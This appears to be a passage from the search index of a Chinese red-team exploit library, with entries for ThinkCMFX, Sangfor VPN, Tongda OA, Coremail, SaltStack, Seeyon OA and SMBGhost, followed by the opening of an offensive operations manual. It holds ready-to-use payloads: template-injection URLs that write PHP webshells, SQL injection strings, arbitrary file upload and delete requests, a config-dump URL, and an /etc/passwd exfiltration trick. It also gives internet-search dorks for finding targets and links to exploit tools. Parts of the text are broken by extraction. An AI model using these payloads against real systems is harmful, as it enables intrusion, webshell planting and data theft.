postid=bind&postid=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+- \u524d\u53f0\u6a21\u7248\u6ce8\u5165\u6f0f\u6d1e -\u53efgetshell\u56db\u5904 \uff08\u4ec5\u5728windows\u73af\u5883\u4e0b\u8bbe\u7f6e\uff09 \u7b2c\u4e00\u5904 http://website/ThinkCMFX/index.php?g=Comment&m=Widget&a=fetch & templateFile=/../public/index&content=<%3fphp+file_put_contents('m.p hp','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e09 \u5904 /index.php?a=fetch&templateFile=public/index&prefix=''&content=<php file_put_contents('test.php','<?php phpinfo(); ?>') \u7b2c\u56db\u5904/index.php?a=fetch&content=<?php+file_put_contents(\"mrxn.php\", base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg== \")); \u4efb\u610f\u6587\u4ef6\u5220\u9664 -\u53ea\u80fdwindows\u5220\u9664 \u5728\u7528\u6237\u4e0a\u4f20\u5934\u50cf\u5904\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305\u540e\uff0c\u4f1a\u5220\u9664\u7f51 \u7ad9\u6839\u76ee\u5f55\u4e0b\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\u3002\uff08\u8be5\u6f0f\u6d1e\u4ec5\u80fd\u5728 Windows \u4e0b\u89e6\u53d1\uff09 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1 Host: localhost Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 27 imgurl=......\\test.txt \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u5728 ThinkCMFX2.2.3 \u6700\u7ec8\u7248\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c\uff09 curl -F \"file=@/tmp/shell.php\" -X \"POST\" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' ' http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload &action=uploadfile' \u4efb\u610f\u6587\u4ef6\u5305\u542b \uff08\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u7b49\uff09 /index.php?a=display&templateFile=README.md","title":"\u6cdb\u5faeE-cology OA\u7cfb\u7edfSQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#vpn","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6df1\u4fe1\u670d VPN \u67d0\u4e2a\u7279\u5b9a\u4ea7\u54c1\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c, 2019 \u653b\u9632\u6f14\u7ec3\u4f7f\u7528\u8fc7 \u5f71\u54cd\u7ec4\u4ef6 \u6df1\u4fe1\u670d VPN \u6f0f\u6d1e\u6307\u7eb9 Set-Cookie: TWFID=welcome to ssl vpn Sinfor Fofa Dork header=\"Set-Cookie: TWFID=\" \u6f0f\u6d1e\u5206\u6790 \u6df1\u4fe1\u670dvpnweb\u767b\u5f55\u9006\u5411\u5b66\u4e60 \u2013 potatso \u2013 \u535a\u5ba2\u56ed https://www.cnblogs.com/potatsoSec/p/12326356.html \u6f0f\u6d1e\u5229\u7528 \uff08\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff09 wget -t %d -T %d --spider %s \u5229\u7528\u6280\u5de7 \u8be5 \u7248 \u672c \u6df1 \u4fe1 \u670d VPN \u5c5e \u4e8e \u76f8 \u5bf9 \u65e9 \u671f \u7684 \u7248 \u672c , \u5927 \u6982 2008 \u5e74 \u5de6 \u53f3 , \u4f46\u76ee\u524d\u8fd8\u6709761\u4e2aip\u5f00\u653e\u5728\u516c\u7f51 \u8be5 \u7248 \u672c \u8f83 \u4f4e , whomai \u4e0d \u5b58 \u5728 , \u53ef \u4ee5 \u4f7f \u7528 uname, \u8fd9\u91cc\u6ca1\u6709\u7a7a\u683c\u53efdns\u4f20\u51fa\u6765 \u53bb\u9664\u7a7a\u683c\u4e5f\u7b80\u5355 cat /etc/passwd | tr \" \\n\" \"+|\" \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u66f4\u65b0\u8865\u4e01\u5347\u7ea7\u5230\u6700\u65b0\u7248 Thinkphp\u76f8\u5173 ThinkPHP3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Gets hell \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 https://xz.aliyun.com/t/99 ThinkPHP3.2.3_\u6700\u65b0\u7248update\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://www.anquanke.com/post/id/104847 ThinkPHP3.2.X_find_select_delete\u6ce8\u5165 \u5f71\u54cd\u7248\u672c <= 3.2.3 2.\u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2631https://xz.aliyun.com/t/2629 ThinkPHP3.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/news/305625 ThinkPHP5_SQL\u6ce8\u5165\u6f0f\u6d1e&&\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u5f71\u54cd\u7248\u672c < 5.0.9 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/125 > < https://www.leavesongs.com/PENETRATION/thinkphp5-in \ufffesqlinjection.html ThinkPHP5.0.10- 3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Getshell \u5f71\u54cd\u7248\u672c < 5.0.11 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 ThinkPHP\u6846\u67b65.0.X_sql\u6ce8\u5165\u6f0f\u6d1e\u5206\u6790 \u5f71\u54cd\u7248\u672c < 5.0.16 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2257 ThinkPHP5.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 5.1.22 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/wangtanzhi/p/12741498.html ThinkPHP5.X_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u5f71\u54cd\u7248\u672c 5.0.5-5.0.22 5.1.0-5.1.30 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/3570https://paper.seebug.org/760https://pap er.seebug.org/770","title":"\u6df1\u4fe1\u670dVPN\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_2","text":"","title":"\u901a\u8fbeOA\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_3","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA2017 \u901a\u8fbeOA V11.x<V11.5 3.\u6f0f\u6d1e\u6307\u7eb9 /static/templates/2017_01/userName.png Office Anywhere 20xx\u7248 \u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf /ispirit/interface/gateway.php 4.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/NS-Sp4ce/TongDaOA-Fake-User https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_e xp.py 5.\u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/lovequitepcs/p/12864203.html 6.\u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u53ef\u4ee5\u4f7f\u7528chrome\u7684EditThisCookie\u63d2\u4ef6\u4fee\u6539cookie\uff0c\u4fee\u6539cookies\u522b\u5fd8\u8bb0\u8bbf \u95ee\uff0c\u5426\u5219\u65e0\u6cd5\u767b\u5f55\u6210\u529f /general/index.php?isIB=0&modify_pwd=0 7.\u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u901a\u8fbeoa\u5230\u6700\u65b0\u7248\u672c","title":"\u901a\u8fbeOA\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_4","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA V11\u7248 \u901a\u8fbeOA 2017\u7248 \u901a\u8fbeOA 2016\u7248 \u901a\u8fbeOA 2015\u7248 \u901a\u8fbeOA 2013\u589e\u5f3a\u7248 \u901a\u8fbeOA 2013\u7248 3.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/jas502n/OA-tongda-RCE 4.\u8be6\u7ec6\u6587\u7ae0 https://zhuanlan.zhihu.com/p/114264570 5.\u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u901a\u8fbeoa\u6700\u65b0\u8865\u4e01 \u5b89\u5168\u66f4\u65b0\u5730\u5740: http://www.tongda2000.com/news/673.php","title":"\u901a\u8fbeOA\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_5","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA v2017\u3001v11.x < v11.5 \u652f\u6301\u626b\u7801\u767b\u5f55\u7248\u672c 3.\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 https://xz.aliyun.com/t/7704#toc-4","title":"\u901a\u8fbeOA\u626b\u7801\u767b\u5f55\u4efb\u610f\u7528\u6237\u767b\u5f55"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#coremail","text":"\u6f0f\u6d1e\u7b80\u4ecb Coremail\u90ae\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e Coremail\u4ea7\u54c1\u8bde\u751f\u4e8e1999\u5e74\uff0c\u7ecf\u8fc7\u4e8c\u5341\u591a\u5e74\u53d1\u5c55\uff0c\u5982\u4eca\u4ece\u4ebf\u4e07\u7ea7\u522b\u7684 \u8fd0\u8425\u7cfb\u7edf\uff0c\u5230\u51e0\u4e07\u4eba\u7684\u5927\u578b\u4f01\u4e1a\uff0c\u90fd\u6709\u4e86Coremail\u7684\u5ba2\u6237\u3002 \u622a\u6b622019\u5e74\uff0cCoremail\u90ae\u4ef6\u7cfb\u7edf\u4ea7\u54c1\u5728\u56fd\u5185\u5df2\u62e5\u670910\u4ebf\u7ec8\u7aef\u7528\u6237 \uff0c\u662f\u76ee\u524d\u56fd\u5185\u62e5\u6709\u90ae\u7bb1\u4f7f\u7528\u7528\u6237\u6700\u591a\u7684\u90ae\u4ef6\u7cfb\u7edf\u3002Coremail\u4eca\u5929\u4e0d\u4f46 \u4e3a\u7f51\u6613\uff08126\u3001163\u3001yeah\uff09\u3001\u79fb\u52a8\uff0c\u8054\u901a\u7b49\u77e5\u540d\u8fd0\u8425\u5546\u63d0\u4f9b\u7535\u5b50\u90ae\u4ef6 \u6574\u4f53\u6280\u672f\u89e3\u51b3\u65b9\u6848\u53ca\u4f01\u4e1a\u90ae\u5c40\u8fd0\u8425\u670d\u52a1\uff0c\u8fd8\u4e3a\u77f3\u6cb9\u3001\u94a2\u94c1\u3001\u7535\u529b\u3001\u653f\u5e9c \u3001\u91d1\u878d\u3001\u6559\u80b2\u3001\u5c16\u7aef\u5236\u9020\u4f01\u4e1a\u7b49\u7528\u6237\u63d0\u4f9b\u90ae\u4ef6\u7cfb\u7edf\u8f6f\u4ef6\u548c\u53cd\u5783\u573e\u670d\u52a1\u3002 \u5229\u7528\u65b9\u5f0f http://host/mailsms/s?func=ADMIN:appState&dumpConfig=/ \u6d4f\u89c8\u5668\u8bf7\u6c42\u8bbf\u95ee\uff0c\u5373\u53ef\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u3002 \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0Coremail\u7248\u672c\u6216\u8054\u7cfb\u5382\u5bb6\u4fee\u590d","title":"Coremail\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#saltstack","text":"\u6f0f\u6d1e\u7b80\u4ecb SaltStack\u662f\u57fa\u4e8ePython\u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\uff0c\u662f\u4e00\u4e2a\u670d \u52a1\u5668\u57fa\u7840\u67b6\u6784\u96c6\u4e2d\u5316\u7ba1\u7406\u5e73\u53f0\uff0c\u5177\u5907\u914d\u7f6e\u7ba1\u7406\u3001\u8fdc\u7a0b\u6267\u884c\u3001\u76d1\u63a7\u7b49\u529f\u80fd \u3002 \u5f71\u54cd\u8303\u56f4\uff1a SaltStack < 2019.2.4 SaltStack < 3000.2 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 Saltstack\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1eEXP https://github.com/Imanfeng/SaltStack-Exp.git \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Cl0wn/p/12918432.html \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0\u7248\u672c SaltStack = 2019.2.4 SaltStack = 3000.2 https://github.com/saltstack/salt/commit/a67d76b15615983d467ed8 1371b38b4a17e4f3b7 https://github.com/saltstack/salt/commit/d5801df94b05158dc8e48c 5e6912b065044720f3","title":"SaltStack\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_6","text":"\u6f0f\u6d1e\u7b80\u4ecb CNVD \u300a \u5173 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u5b89\u5168\u516c\u544a\u300b\uff1a https://www.cnvd.org.c n/webinfo/show/5095 \u8be5 \u7cfb \u7edf \u7684 \u6f0f \u6d1e \u70b9 \u5728 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u7684Servlet\u63a5\u53e3\u66b4\u9732\uff0c\u5b89\u5168\u8fc7\u6ee4\u5904\u7406\u63aa\u65bd\u4e0d\u8db3\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u65e0\u9700 \u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3002 \u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u7f51\u7ad9\u540e \u95e8\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u6743\u9650\uff0c\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u6f0f\u6d1e \u3002 \u5f71\u54cd\u8303\u56f4 \u81f4\u8fdcOA A8-V5 V6.1 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP2 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP3 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.1 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/timwhitez/seeyon-OA-A8-GetShell \u8be6\u7ec6\u6587\u7ae0 https://www.jianshu.com/p/0955bdd7329c \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8be6\u60c5 https://www.cnblogs.com/AtesetEnginner/p/12106741.html","title":"\u81f4\u8fdcOA\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#_2","text":"","title":"\u5386\u53f2\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#cve-2020-0796","text":"\u6f0f\u6d1e\u7b80\u4ecb \u5fae\u8f6fSMBv3 Client/Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2020-0796 \u5f71\u54cd\u8303\u56f4\uff1a Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64- based SystemsWindows Server, Version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, Version 1909 (Server Core installation) \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/chompie1337/SMBGhost_RCE_PoC \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Iamyoyodan/p/13081273.html \u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u5076\u5c14\u4f1a\u84dd\u5c4f \u9632\u62a4\u65b9\u6cd5 \u5173\u95ed\u9ad8\u5371\u7aef\u53e3139\u3001445\uff0c\u66f4\u65b0\u7cfb\u7edf\u5b89\u5168\u8865\u4e01\u7981\u7528SMBv3\u538b\u7f29\u547d\u4ee4: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\ Parameters\" DisableCompression -Type DWORD -Value 1 - Force","title":"CVE-2020-0796 \u6c38\u6052\u4e4b\u9ed1\u6f0f\u6d1e\u76f8\u5173"},{"location":"redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/","text":"HW\u5f39\u836f\u5e93\u4e4b\u7ea2\u961f\u4f5c\u6218\u624b\u518c \u672c\u6587\u6765\u81eaklionsec\u7684github \u8bf4\u660e \u4ee5\u4e0b\u4ec5\u9488\u5bf9\u65e5\u5e38 \"\u7ea2\u961f\"\u573a\u666f,\u8fdb\u884c\u4e86\u4e00\u6b21\u76f8\u5bf9\u5168\u9762\u5b8c\u6574\u7684\u5b9e\u6218\u653b\u51fb\u5229\u7528\u6280\u672f\u63d0\u70bc\u6c47\u603b\uff0c\u9488\u5bf9\u4e0d\u540c\u7684\u6e17\u900f\u9636\u6bb5,\u6240\u53ef\u80fd\u4f1a\u7528\u5230\u7684\u4e00\u4e9b\u6280\u672f\u90fd\u505a\u4e86\u8be6\u5c3d\u68b3\u7406\u8bf4\u660e(\u540e\u9762\u53ef\u80fd\u8fd8\u4f1a\u6574\u7406\u51fa\u5bf9\u5e94\u7684\u5b8c\u6574\u5de5\u5177\u94fe,\u867d\u7136\u90a3\u4e0d\u662f\u6700\u4e3b\u8981\u7684),\u7531\u4e8e\u7ea2\u961f\u4e0d\u540c\u4e8e\u4e00\u822c\u7684\u6e17\u900f\u6d4b\u8bd5,\u5f3a\u8c03\u66f4\u591a\u7684\u662f\u5982\u4f55\u641e\u8fdb\u53bb\u62ff\u5230\u76f8\u5e94\u673a\u5668\u6743\u9650\u6216\u8005\u5b9e\u73b0\u67d0\u7279\u5b9a\u76ee\u7684\u800c\u4e0d\u5c40\u9650\u4e8e\u4f60\u4e00\u5b9a\u8981\u5728\u4ec0\u4e48\u65f6\u95f4,\u7528\u4ec0\u4e48\u6280\u672f\u6216\u8005\u5fc5\u987b\u901a\u8fc7\u4ec0\u4e48\u9014\u5f84\u53bb\u641e,\u76f8\u6bd4\u4f20\u7edf\u6e17\u900f\u6d4b\u8bd5,\u7ea2\u961f\u5219\u66f4\u8d8b\u4e8e\u771f\u5b9e\u7684\u5165\u4fb5\u6d3b\u52a8\u8fd9\u79cd\u573a\u666f\u5176\u5b9e\u5bf9\u9632\u5fa1\u8005\u7684\u5b9e\u6218\u5bf9\u6297\u7ecf\u9a8c\u548c\u6280\u672f\u6df1\u5ea6\u90fd\u662f\u6bd4\u8f83\u5927\u7684\u6311\u6218,\u6240\u4ee5\u4ee5\u4e0b\u7684\u6240\u6709\u6280\u672f\u70b9\u4e5f\u51e0\u4e4e\u90fd\u662f\u5b8c\u5168\u7ad9\u5728\u8fd9\u79cd\u573a\u666f\u548c\u89d2\u5ea6\u4e0b\u6765\u8003\u91cf\u68b3\u7406\u7684\u9700\u8981\u7279\u522b\u8bf4\u660e\u7684\u662f, \u6240\u6709\u653b\u51fb\u624b\u6cd5\u5728\u73b0\u5b9e\u4e2d\u90fd\u7edd\u4e0d\u662f\u5b8c\u5168\u5b64\u7acb\u4f7f\u7528\u7684,\u5f80\u5f80\u5f88\u591a\u624b\u6cd5\u90fd\u662f\u76f8\u4e92\u7075\u6d3b\u7ec4\u5408\u8d77\u6765\u8fdb\u884c\u5faa\u73af\u5229\u7528,\u7531\u4e8e\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u90fd\u662f\u57fa\u4e8e\u672c\u4eba\u5e73\u65f6\u5b66\u4e60\u5b9e\u6218\u79ef\u7d2f\u7684\u4e00\u4e9b\u7ecf\u9a8c,\u52a0\u4e4b\u6bcf\u4e2a\u4eba\u7684\u5b9e\u9645\u6e17\u900f\u601d\u8def\u90fd\u4e0d\u540c,\u6240\u4ee5\u80af\u5b9a\u4f1a\u6709\u9057\u6f0f\u7684\u5730\u65b9,\u4e5f\u6b22\u8fce\u5f1f\u5144\u4eec\u4e00\u8d77\u6765\u79ef\u6781\u6307\u6b63\u8865\u5145\u5b8c\u5584,\u4e2a\u4eba\u89c9\u5f97,\u6700\u597d\u7684\u9632\u5fa1\u6c38\u8fdc\u4e0d\u662f\u600e\u4e48\u53bb\u9632\u67d0\u4e2a\u5de5\u5177,\u662f\u4e2a\u660e\u767d\u4eba\u90fd\u77e5\u9053,\u56e0\u4e3a\u5de5\u5177\u8fd9\u4e9b\u4e1c\u897f\u672c\u8eab\u5c31\u662f\u6b7b\u7684,\u7a0d\u5fae\u6539\u4e0b,\u5b9a\u5236\u4e0b,\u73b0\u6709\u7684\u89c4\u5219\u53ef\u80fd\u9a6c\u4e0a\u5c31\u9632\u4e0d\u4f4f\u4e86,\u4e14\u4e00\u76f4\u4f1a\u5904\u4e8e\u75b2\u4e8e\u5e94\u4ed8\u7684\u88ab\u52a8\u9632\u5fa1\u72b6\u6001,\u5c24\u5176\u662f\u9488\u5bf9\u7ea2\u961f\u8fd9\u79cd\u7279\u6b8a\u573a\u666f\u7684,\u4f60\u7684\u5b9e\u9645\u5bf9\u624b\u5f88\u53ef\u80fd\u90fd\u662f\u6709\u4e00\u5b9a\u6280\u672f\u5b9e\u529b\u7684\u4eba,\u6240\u4ee5\u9488\u5bf9\u6bcf\u79cd\u6838\u5fc3\u7684\u653b\u51fb\u6280\u672f\u6280\u672f\u5c55\u5f00\u505a\u6df1\u5165\u5206\u6790, \u76f4\u63a5\u4ece\u6e90\u5934\u4e0a\u8fdb\u884c\u9632\u5fa1\u624d\u662f\u6700\u9760\u8c31\u7684,\u867d\u7136\u8bf4\u77ed\u671f\u8fd9\u79cd\u6210\u672c\u4ee3\u4ef7\u76f8\u5bf9\u8f83\u9ad8, \u4f46\u957f\u671f\u6765\u770b, \u662f\u4e00\u52b3\u6c38\u9038\u7684,\u6c89\u6dc0\u4e0b\u6765\u7684\u8fd9\u4e9b\u4e1c\u897f\u6700\u7ec8\u4e5f\u4f1a\u6162\u6162\u5f62\u6210\u81ea\u5df1\u4ea7\u54c1\u7684\u6838\u5fc3\u7ade\u4e89\u529b\u548c\u7279\u8272,\u8bf4\u767d\u70b9,\u8fd9\u79cd\u5bf9\u6297,\u672c\u8d28\u4e0a\u62fc\u7684\u8fd8\u662f\u53cc\u65b9\u7684\u6280\u672f\u5b9e\u529b,\u4e0d\u4ec5\u8981\u80fd\u5728\u4e0d\u77e5\u89c9\u7684\u60c5\u51b5\u4e0b\u641e\u8fdb\u53bb,\u800c\u4e14\u8981\u80fd\u65e0\u9650\u5236\u52a0\u5927\u5bf9\u65b9\u540e\u671f\u7684\u6eaf\u6e90\u6210\u672c\u53e6\u5916,\u4f5c\u4e3a\u4e00\u540d\u5408\u683c\u7684\u653b\u9632\u4eba\u5458,\u5de5\u5177\u7684\u719f\u7ec3\u638c\u63e1\u4ec5\u4ec5\u53ea\u662f\u6781\u5c0f\u7684\u4e00\u90e8\u5206,\u5bf9\u5404\u79cd\u5229\u7528\u539f\u7406\u7684\u6df1\u5ea6\u7406\u89e3\u548c\u4e8c\u6b21\u5b9a\u5236\u80fd\u529b\u624d\u662f\u4f60\u7684\u6838\u5fc3. \u65e5\u5e38\u6d41\u7a0b\u7b80\u8981\u8bf4\u660e \u5165\u53e3\u6743\u9650 => \u5185\u7f51\u641c\u96c6/\u63a2\u6d4b => \u514d\u6740\u63d0\u6743[\u975e\u5fc5\u987b] => \u6293\u53d6\u767b\u5f55\u51ed\u8bc1 => \u8de8\u5e73\u53f0\u6a2a\u5411 => \u5165\u53e3\u7ef4\u6301 => \u6570\u636e\u56de\u4f20 => \u5b9a\u671f\u6743\u9650\u7ef4\u62a4 0x01 